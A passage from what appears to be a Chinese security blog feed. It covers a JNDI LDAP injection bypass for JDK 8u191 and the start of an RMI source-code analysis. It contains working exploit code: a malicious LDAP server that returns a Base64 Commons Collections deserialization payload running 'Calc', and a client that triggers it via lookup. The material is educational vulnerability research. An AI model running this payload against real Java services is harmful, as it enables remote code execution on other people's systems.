class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPServerBypass8u191</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        <span class="comment">// 远程类加载用的codebase，这里没用</span></span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1/#EXP&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[<span class="number">0</span>])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="comment">//反序列化点</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.getDecoder().decode(</span><br><span class="line">                    <span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAEa2V5MnNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWVwdAAJZ2V0TWV0aG9kdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAcc3EAfgATdXEAfgAYAAAAAnBwdAAGaW52b2tldXEAfgAcAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VxAH4AGAAAAAF0AARDYWxjdAAEZXhlY3VxAH4AHAAAAAFxAH4AH3NxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAXQABGtleTF0AAZ2YWx1ZTF4eHQABkphc3Blcng=&quot;</span></span><br><span class="line">            ));</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPCientBypass8u191</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// lookup参数注入触发</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(<span class="string">&quot;ldap://localhost:1234/EXP&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">// 输出Base64后的对象</span></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">    out.writeObject(o);</span><br><span class="line">    out.close();</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">    System.out.println(<span class="string">&quot;res = &quot;</span> + res);</span><br><span class="line">    System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次启动客户端和服务端，即可打通。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695728842464-59bc4365-12a1-4c44-bd39-c78344505fb0.png" alt="image.png"><br>注意：</p><ul><li>Server端大部分代码是起一个LDAP服务，关键点笔者给了注释，不用全看懂</li><li>Server端的codebase是随便设都可以的，这个利用方式用不到远程加载</li></ul><h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">readObject:424, ObjectInputStream</span><br><span class="line">deserializeObject:531, Obj</span><br><span class="line">decodeObject:239, Obj</span><br><span class="line">c_lookup:1051, LdapCtx</span><br><span class="line">p_lookup:542, ComponentContext</span><br><span class="line">lookup:177, PartialCompositeContext</span><br><span class="line">lookup:205, GenericURLContext</span><br><span class="line">lookup:94, ldapURLContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:10, JNDILDAPCientBypass8u191</span><br></pre></td></tr></table></figure><p>看调用栈可以看到，一共套娃调用了6层lookup方法，笔者这里直接从LdapCtx#c_lookup开始分析<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695729834756-080f59b2-9525-4c01-bcf6-eba20c5e6e4b.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695730217604-469a17d2-abbe-42e2-aa85-bf332baad58d.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695730310853-6d09e1b1-f9f1-4898-bfb5-ab8d15d5a825.png" alt="image.png"><br>至此，JNDI的LDAP触发反序列化的调试结束。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>JNDI官方教程<br><a href="https://docs.oracle.com/javase/tutorial/jndi/TOC.html">https://docs.oracle.com/javase/tutorial/jndi/TOC.html</a><br>JDK版本修复日志<br><a href="https://www.oracle.com/java/technologies/javase/8u121-relnotes.html">https://www.oracle.com/java/technologies/javase/8u121-relnotes.html</a><br><a href="https://www.oracle.com/java/technologies/javase/8u191-relnotes.html">https://www.oracle.com/java/technologies/javase/8u191-relnotes.html</a><br>JDK补丁代码对比<br><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/a58fca2f8a5d">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/a58fca2f8a5d</a><br><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/2db6890a9567">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/2db6890a9567</a><br>JNDI注入漏洞参考<br><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a><br><a href="https://www.bilibili.com/video/BV1ct4y1h79t">https://www.bilibili.com/video/BV1ct4y1h79t</a><br><a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a><br><a href="https://tttang.com/archive/1611">https://tttang.com/archive/1611</a><br><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a><br><a href="https://tttang.com/archive/1405">https://tttang.com/archive/1405</a><br><a href="https://paper.seebug.org/942/">https://paper.seebug.org/942/</a><br><a href="https://www.cnblogs.com/bitterz/p/15946406.html#">https://www.cnblogs.com/bitterz/p/15946406.html#</a></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>JNDI注入，攻击面很多，本质是类加载和反序列化。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;根据官方教程，JNDI（Java Naming and Directory Interface）是为Java程序提供的，一组用来统一调用命名</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="JNDI" scheme="https://jaspersec.top/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>RMI漏洞分析</title>
    <link href="https://jaspersec.top/posts/3242753911.html"/>
    <id>https://jaspersec.top/posts/3242753911.html</id>
    <published>2023-12-24T02:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>时间有限，目前只跟完了RMI的源码分析部分，攻击和绕过只有下周再来了。<br>不过跟源码也已经发现了一些有意思的反序列化点，也算是为后面学习打基础了。</p><p>更新：RMI的攻击分析也差不多结束了，还差JEP290的绕过不太想看，我要去修手机了。</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>看了一些师傅的文章，发现RMI交互这块内容写得都异常混乱，大篇幅的文字，很容易看得云里雾里。<br>这里我按照下图标号的顺序，依次调试每一块代码，并对代码进行标注，希望能对师傅们有所帮助。</p><p>推荐先看完组长的视频，自己跟着调一遍，此时可能会感觉云里雾里、不知所云，这是正常的；<br>接着再看素十八师傅的博客，主要是源码分析这一块，再调试一遍，基本就能掌握了。</p><h2 id="一图胜千言"><a href="#一图胜千言" class="headerlink" title="一图胜千言"></a>一图胜千言</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694537254610-7d9b9003-0690-4413-af92-762888b064e9.png" alt="1.png"></p><h2 id="服务端创建注册中心"><a href="#服务端创建注册中心" class="headerlink" title="服务端创建注册中心"></a>服务端创建注册中心</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694501455982-dc009e40-9c77-4969-b2d4-c737cf3d4226.png" alt="image.png"><br>创建RegistryImpl对象<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694501608137-fb1d05ad-0f5c-4788-9456-2cd461075787.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694501774073-c020cd1f-4087-4df8-826a-24e958679c52.png" alt="image.png"><br>setup#UnicastServerRef#exportObject暴露RegistryImpl对象<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694502215812-7c05094e-a70f-481a-89c8-754b9c8f6d34.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694502648423-9f095b22-c4ca-42bc-bbdf-df3948f228de.png" alt="image.png"><br>LiveRef#exportObject暴露Target对象，三层套娃。<br>LiveRef#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694502785168-a0f00105-bf2a-40b6-a60a-0653b1b28c9a.png" alt="image.png"><br>TCPEndpoint#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694503088435-274f0f49-280c-4395-bc79-9882a3394a0e.png" alt="image.png"><br>TCPTransport#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694503553792-9a8aedda-1347-4b78-8a1b-a6059a2e06da.png" alt="image.png"><br>最后，把封装了RegiseryImpl_Stub的Target记录进hashtable里，至此注册中心创建完成。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694503721620-8e1dad87-9e26-42da-9d2b-2a4850958d87.png#averageHue=%23104688&clientId=uf0282921-bd1e-4&from=paste&height=234&id=iVLMU&originHeight=292&originWidth=1225&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55669&status=done&style=none&taskId=u079cbc24-39f8-4634-8b9c-1602aa822d2&title=&width=980" alt="image.png"><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694503776730-95951cf1-8a9c-43d9-b03a-c54e470356c2.png" alt="image.png"></p><h2 id="服务端创建远程对象"><a href="#服务端创建远程对象" class="headerlink" title="服务端创建远程对象"></a>服务端创建远程对象</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694504219799-4db0ee3c-f869-403c-9c29-73676c98fbe2.png" alt="image.png"><br>创建RemoteObjectImpl对象</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508220650-d9d0d666-14c8-4738-ad9d-adb5e569a0f0.png" alt="image.png"></p><p>调用父类UnicastRemoteObject构造函数，二层套娃。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508263787-dda626b0-bd59-4dd3-8b86-0d34e76e9643.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508377611-0b70f624-35f8-42a6-9451-b4c843df3edf.png" alt="image.png"><br>UnicastRemoteObject#exportObject暴露RemoteObjectImpl对象，二重套娃。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508571800-09a055b0-10c6-4c7f-9f86-6e21015538b5.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508730306-c787faec-ee5a-4dcf-8f69-7645f534f0f5.png" alt="image.png"><br>UnicastServerRef#exportObject暴露RemoteObjectImpl对象<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508991975-e1656129-5383-422e-b55d-04f4b1eb9621.png" alt="image.png"><br>LiveRef#exportObject暴露Target对象，三层套娃。<br>LiveRef#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694502785168-a0f00105-bf2a-40b6-a60a-0653b1b28c9a.png" alt="image.png"><br>TCPEndpoint#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694503088435-274f0f49-280c-4395-bc79-9882a3394a0e.png" alt="image.png"><br>TCPTransport#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694509237414-3a9b728d-b30b-41dc-8ce8-43400618473a.png" alt="image.png"><br>最后，把封装了RemoteObjectImpl_Stub的Target记录进hashtable里，至此远程对象创建完成。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694509401415-a4186191-0a1f-4373-9800-87e597f5cfce.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694509461059-c2a68346-2817-435e-af0a-c5e5a12c6c3b.png" alt="image.png"></p><h2 id="服务端远程对象绑定注册中心"><a href="#服务端远程对象绑定注册中心" class="headerlink" title="服务端远程对象绑定注册中心"></a>服务端远程对象绑定注册中心</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694509897011-29ed231d-9c69-4412-9835-c39c597ef638.png" alt="image.png"><br>调用RegistryImpl_Stub#bind()绑定远程对象与名称，将name和对应obj存入bindings，绑定过程到此结束。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694510186510-88f32b48-b162-4c13-ac5c-7dbe5d4d1a49.png" alt="image.png"></p><h2 id="注册中心接受并处理服务端绑定请求"><a href="#注册中心接受并处理服务端绑定请求" class="headerlink" title="注册中心接受并处理服务端绑定请求"></a>注册中心接受并处理服务端绑定请求</h2><p>注册中心通过TCPTransport#handleMessages处理服务端发过来的绑定相关的请求。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694856852769-5f5ffc9d-d674-45a8-aa63-d456f5058647.png" alt="image.png"><br>由于是注册中心代理对象，套娃调oldDispatch处理分发请求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694856970027-81ca45aa-aaef-455f-8fb4-bc4be0d6c5b4.png" alt="image.png"><br>再套娃调用RegistryImpl_Skel#dispatch方法，这个方法真正处理服务端发过来的绑定请求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694857036043-13f9a5e4-554c-4714-8869-c0b04f5fe83b.png" alt="image.png"><br>反序例化服务端传过来的bind(name, remote)里的name和remote，这里如果传恶意remote对象则存在漏洞<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694857338012-b42469ce-467e-4ddf-a2be-15de8f100a0b.png" alt="image.png"></p><h2 id="客户端获取注册中心代理对象"><a href="#客户端获取注册中心代理对象" class="headerlink" title="客户端获取注册中心代理对象"></a>客户端获取注册中心代理对象</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694517251764-3531168c-35f7-4ddf-9b26-7b5f3a66f743.png" alt="image.png"><br>套娃一层getRegistry，函数重载<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694517778630-e9830bad-4d9a-4fc5-b253-a346409ed703.png" alt="image.png"><br>根据host&#x2F;ip封装LiveRef和UnicastRef<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694518167318-840e537b-98be-4220-8664-2ba22adb1a76.png" alt="image.png"><br>通过Ref和RegistryImpl来创建注册中心的代理对象<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694518366441-fb088583-8cf0-4b25-9c20-7d84eb5bd835.png" alt="image.png"><br>到此为止，注册中心的代理对象就创建完毕了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694518623979-9a0de36a-af1f-4ccd-b054-06c6f7fa9298.png" alt="image.png"></p><h2 id="客户端通过注册中心代理查找远程对象"><a href="#客户端通过注册中心代理查找远程对象" class="headerlink" title="客户端通过注册中心代理查找远程对象"></a>客户端通过注册中心代理查找远程对象</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694520985613-f470c71f-fae3-4960-9567-fdb3a2144e14.png" alt="image.png"><br>调用RegistryImpl_Stub#lookup获取查找的远程对象的代理<br>下面这里直接return var23，返回反序列化后的远程对象的代理<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694521407090-bafeecea-1440-49de-92c3-6c675de05b25.png" alt="image.png"></p><h2 id="注册中心收到查询请求并返回远程对象的代理"><a href="#注册中心收到查询请求并返回远程对象的代理" class="headerlink" title="注册中心收到查询请求并返回远程对象的代理"></a>注册中心收到查询请求并返回远程对象的代理</h2><p>这里开始涉及C&#x2F;S交互，首先DEBUG起一个RMIServer，断点打在TCPTransport#handleMessages，<br>这个函数专门用于处理请求信息，然后运行RMIClient，由于执行了lookup方法，所以能命中断点开始调试。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694529541440-fe168494-470a-4407-a43c-c92e311bdcf1.png" alt="image.png"><br>调用serviceCall进一步处理网络请求信息，最后调用到UnicastServerRef#dispatch<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694530230137-02dce31c-e955-4be8-935d-63cd5d4a4eec.png" alt="image.png"><br>这里套娃调用UnicastServerRef#oldDispatch<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694531032551-7874a1b4-7308-4dcb-b96d-b009c38d0dec.png" alt="image.png"><br>再套娃调用skel#dispatch，最终肯定是通过服务端的代理skel来处理网络请求的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694531559917-0d20046a-a039-4d12-940b-6d55b623ee24.png" alt="image.png"><br>调用RegistryImpl_Skel#dispatch，获取Client传过来的name，另外新建RegistryImpl，在Server端本地调用RegistryImpl.lookup(name)，获取返回的远程对象，序列化写回网络连接中，传给Client。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694532235455-439a129d-b747-4aac-b7a9-09ecfcf15445.png" alt="image.png"></p><h2 id="客户端调用远程对象的方法并获取返回结果"><a href="#客户端调用远程对象的方法并获取返回结果" class="headerlink" title="客户端调用远程对象的方法并获取返回结果"></a>客户端调用远程对象的方法并获取返回结果</h2><p>同样涉及C&#x2F;S交互，不过这里DEBUG的是Client，Server正常运行起就行，Client DEBUG启动。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694534301981-07d01ba5-496c-469e-8d01-33e9003fd3f5.png" alt="image.png"><br>Client获取的是远程对象的动态代理stub，它调用任意方法都会走到invoke里<br>三层套娃调用<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694534399672-e82b8571-2153-4ff1-933a-325a94b7e92e.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694534459744-4e5f7e18-6bab-44e9-9294-a585115a6c5a.png" 